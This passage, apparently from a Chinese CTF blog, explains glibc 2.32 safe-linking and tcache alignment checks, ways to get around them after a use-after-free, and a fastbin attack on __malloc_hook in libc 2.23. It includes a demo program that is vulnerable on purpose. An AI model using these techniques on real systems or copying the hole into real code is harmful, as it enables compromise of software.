class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Fastbin中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">    *fb = p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">        old2 = old;</span><br><span class="line">        p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">       != old2);</span><br></pre></td></tr></table></figure>

<p>再加上其他</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">p = REVEAL_PTR (p-&gt;fd);</span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">*fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">tmp = REVEAL_PTR (tmp-&gt;next))</span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">nextp = REVEAL_PTR (p-&gt;fd);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)            \</span></span><br><span class="line"><span class="keyword">do</span>                            \</span><br><span class="line">&#123;                            \</span><br><span class="line">    victim = pp;                    \</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)                \</span><br><span class="line">    <span class="keyword">break</span>;                        \</span><br><span class="line">    pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned fastbin chunk detected"</span>); \</span><br><span class="line">&#125;                            \</span><br><span class="line"><span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line">     != victim);                    \</span><br></pre></td></tr></table></figure>

<p>等多多少少用到tcache和fastbin的地方。而unsortebin、largebin、smallbin都不会进行相关指针异或。</p>
<h5 id="2-新增机制Safe-linking的漏洞"><a href="#2-新增机制Safe-linking的漏洞" class="headerlink" title="(2)新增机制Safe-linking的漏洞"></a>(2)新增机制Safe-linking的漏洞</h5><p>①规律性</p>
<p>官方说的是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">of Fast-Bins and TCache.  That is, mask the "next" pointers of the</span></span><br><span class="line"><span class="comment">lists' chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">still works.  */</span></span><br></pre></td></tr></table></figure>

<p>基于ASLR之后的堆地址，即Key值为第一个进入该大小TcacheBin链的chunk的地址右移12bit得到，对于Fastbin也是一样的。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_T5VVHKP5E254NJ2.jpg" alt="Snipaste_2021-08-25_19-54-16"></p>
<p>②特殊性</p>
<p>虽说FD被加密，但是由于是异或的关系，在UAF的特殊条件下其实是可以控制FD指向其他堆块的。</p>
<p>比如说我们进行一定的堆布局，尝试将堆块集中在0x100内，然后可以爆破1个字节来进行计算：</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_BX3K4W444SXW6H7.jpg" alt="Snipaste_2021-08-25_17-50-30"></p>
<p>这里就chunk4-&gt;chunk3-&gt;chunk2-&gt;chunk1。</p>
<p>这里就假设我们爆破1字节后已经知道了heapbase/0x1000左移12bit的最后一个字节为0x59。现在进行计算一下，如果我们想把chunk4的FD指向chunk1在没有Leak的情况下应该怎么修改？</p>
<p>计算0x10^0x59=0x49，所以如果我们利用UAF部分写chunk4的FD的第一个字节为0x49，那么实际上其实指向的就是chunk1。这个在没有泄露地址而Size又做限制导致只能用Fastbin和Tcache时，可以采用这种方法爆破。所以实际上的期望应该是1/256，这个尝试一下应该就可以实现的。</p>
<h5 id="3-新增Tcache地址对齐检查"><a href="#3-新增Tcache地址对齐检查" class="headerlink" title="(3)新增Tcache地址对齐检查"></a>(3)新增Tcache地址对齐检查</h5><p>①tcache_get中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.32</span></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">    tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">    e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.31</span></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">    e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在tcache_get中新增了一个检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br></pre></td></tr></table></figure>

<p>这个导致了我们的tcache不能任意申请了，<strong>必须是0x10对齐的</strong>，这个可能会导致不少的手段变化。</p>
<p>②tcache结构释放函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!tcache)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">    tcache = <span class="literal">NULL</span>;</span><br><span class="line">    tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">                malloc_printerr (<span class="string">"tcache_thread_shutdown(): "</span></span><br><span class="line">                                 <span class="string">"unaligned tcache chunk detected"</span>);</span><br><span class="line">            tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">            __libc_free (e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"tcache_thread_shutdown(): "</span></span><br><span class="line">                     <span class="string">"unaligned tcache chunk detected"</span>);</span><br></pre></td></tr></table></figure>

<p>即当程序退出，释放tcache结构体时会加入对tcache中所有chunk进行地址对齐检查，但是这个对exit()的攻击没什么影响。</p>
<p>③Tcache中double free检查中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = REVEAL_PTR (tmp-&gt;next))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">            malloc_printerr (<span class="string">"free(): unaligned chunk detected in tcache 2"</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">        <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): unaligned chunk detected in tcache 2"</span>);</span><br></pre></td></tr></table></figure>

<p>当tcache进行Free的double free检查时，如果tcache中第一个bin的chunk地址不对齐，也会错误。其实最开始不太理解，想这能有啥用，最开始Free的时候不就已经进行地址对齐检查了吗。后面想到由于stashing机制，可能会将地址不合法的Chunk放入到tcache中，所以再进行对应Bin大小的chunk释放时，进行检查提高安全性吧。<strong>这个我们在利用的时候也需要注意下，别到时候得到了用Stashing机制放入一个不合法chunk之后再free导致程序出错了。</strong></p>
<p>想感叹一下，在2.31及以下版本，只有在_int_free函数中才有一个地址对齐检查，这2.32突然加了好几个，真是挺猛的。</p>
<h4 id="2-UAF常见限制-2"><a href="#2-UAF常见限制-2" class="headerlink" title="2.UAF常见限制"></a>2.UAF常见限制</h4><h5 id="1-UAF-Leak-Size不做限制-1"><a href="#1-UAF-Leak-Size不做限制-1" class="headerlink" title="(1)UAF+Leak+Size不做限制:"></a>(1)UAF+Leak+Size不做限制:</h5><p>这个如上图中就可以直接leak出chunk1的内容得到key，然后释放unsortedbin chunk泄露libc地址后，利用key异或对应地址即可任意申请。</p>
<h5 id="2-UAF-Leak-Size做限制-2"><a href="#2-UAF-Leak-Size做限制-2" class="headerlink" title="(2)UAF+Leak+Size做限制:"></a>(2)UAF+Leak+Size做限制:</h5><p>一样的，Leak出key之后，修改size得到unsortedbin chunk之后泄露libc地址，异或改掉FD任意申请chunk。</p>
<h5 id="3-UAF-无Leak-Size做限制"><a href="#3-UAF-无Leak-Size做限制" class="headerlink" title="(3)UAF+无Leak+Size做限制:"></a>(3)UAF+无Leak+Size做限制:</h5><p>这条件下的想半天实在没想出来，爆破两个字节倒是可以申请到Tcache结构体，但是两个字节的期望却达到了0xffff=65535，实际的线上CTF中可能爆出来黄花菜都凉了。</p>
<p> ▲爆破两字节申请Tcache Struct：</p>
<p> 比如我们先爆破一个字节，使得heapbase的地址为0xabcde5500000</p>
<p> 然后我们按照上述方法，用一定堆布局，计算一下地址</p>
<p> 异或之后的地址应该为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1:                <span class="number">0xabcde5500400</span> ^ <span class="number">0xabcde5500</span> = <span class="number">0</span>x--(<span class="number">0x0400</span>^<span class="number">0x5500</span>)</span><br><span class="line">TcacheStruct:        <span class="number">0xabcde5500000</span> ^ <span class="number">0xabcde5500</span> = <span class="number">0</span>x--(<span class="number">0x0000</span>^<span class="number">0x5500</span>)</span><br></pre></td></tr></table></figure>

<p>那么就可以直接该指向chunk1地址的最后两个字节为5500即可指向Tcache结构体，然后释放进入unsortedbin踩下libc地址再爆破申请stdout泄露地址，这样又会出来半个字节爆破空间。即0xfffff=1048575，直接GG。</p>
<p> ▲size做限制其实没差别，可以爆破一个字节来修改的。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当然，UAF其实是特别好利用的一种，高版本下也对应有很多的骚操作，比如</p>
<p> <code>house of pig</code> :<a href="https://www.anquanke.com/post/id/242640" target="_blank" rel="noopener">house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p> <code>house of banana</code> :<a href="https://www.anquanke.com/post/id/222948" target="_blank" rel="noopener">house of banana - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p> 等等现在大多的题目都是off by null + 堆布局，尤其是堆布局这一块，实在是无比考验对堆的理解，因为万一其中哪个地方想错，直接就得推倒重来。</p>
<h2 id="不同libc版本下UAF的利用手法总结"><a href="#不同libc版本下UAF的利用手法总结" class="headerlink" title="不同libc版本下UAF的利用手法总结"></a>不同libc版本下UAF的利用手法总结</h2><p>参考学习（抄）安全客<a href="https://www.anquanke.com/post/id/241316" target="_blank" rel="noopener">@lemon</a>文章</p>
<p>pwn方向涉及的libc版本众多，不同版本之间的堆块在组织方式上都有差别，本文来通过同一个UAF的demo程序，学习不同版本libc下的利用手法，包括libc2.23，libc2.27，libc2.31和libc2.32下的利用手法。</p>
<p> 程序源码如下，给出了较为宽松的堆块编辑方式和组织方式，方便讨论利用手法。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizearray[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> *heaparray[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1.add"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2.edit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3.delete"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4.show"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5.exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"choice&gt; "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">20</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"size?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">size</span> = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">size</span> &lt; <span class="number">0x500</span>)</span><br><span class="line">        sizearray[i] = <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    heaparray[i] = p;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, p, <span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, heaparray[i], sizearray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">puts</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">free</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    myinit();</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">            add();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">            edit();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">delete</span> ();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">4</span>)</span><br><span class="line">            show();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">5</span>)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><p> 2.23的UAF是比较经典的利用手法了，此时libc还没有引入tcache结构，仅仅通过fastbin来管理较小的chunk，在libc2.23下可以利用fastbin attack来攻击__malloc_hook来getshell。</p>
<p> 具体步骤，是先通过申请一个属于unsorted bin大小的堆块，利用UAF+binary的show功能来泄露libc的基地址，再通过uaf申请满足fastbin大小的chunk，并修改其fd指针，将__malloc_hook周围满足检查的地址链到fastbin中，再次申请相同大小的chunk即可将其取出，修改为one_gadget即可getshell。</p>
<p> 修改<strong>malloc_hook的原因是在</strong>libc_malloc中会先于分配过程检查<strong>malloc_hook是否为空，若不为空则调用。</strong>malloc_hook在首次malloc的时候会用作初始化相关的工作来使用，往后其值为0，因为在从fastbin中取chunk的过程中会检查size是否合法，所以要在<strong>malloc_hook周围找出一块合法的地址，经验来说，在</strong>malloc_hook – 0x23的位置处有一个合法的size位，可以用来伪造chunk。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220808085519811.png" alt="image-20220808085519811"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 